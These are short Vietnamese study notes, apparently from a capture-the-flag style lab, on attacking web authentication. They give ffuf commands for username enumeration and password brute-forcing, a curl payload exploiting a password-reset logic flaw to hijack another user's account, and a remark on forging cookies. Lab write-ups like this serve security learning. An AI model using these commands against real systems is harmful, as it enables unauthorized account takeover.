
### Username Enumeration

+ Có thể dùng form đăng ký kèm thông báo tài khoản này đã tồn tại để quét những username tồn tại trên hệ thống
+ `ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.178.157/customers/signup -mr "username already exists"` 
+ Tool ffuf : [ffuf/ffuf: Fast web fuzzer written in Go](https://github.com/ffuf/ffuf)

### Brute force

+ `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.178.157/customers/login -fc 200`
	+ W1 : username
	+ W2 : password
	+ `-fc` : Kiểm tra HTTP status code khác với giá trị truyền vào
### Logic flaw

+ Tận dụng lỗi logic của lập trình viên
+ `curl 'http://10.10.178.157/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=**{username}**@customer.acmeitsupport.thm'` Sử dụng payload này để sử dụng email của chính mình để reset password của tài khoản robert

### Cookie

+ Có thể gửi vào trường Cookie untrusted data để đánh lừa hệ thống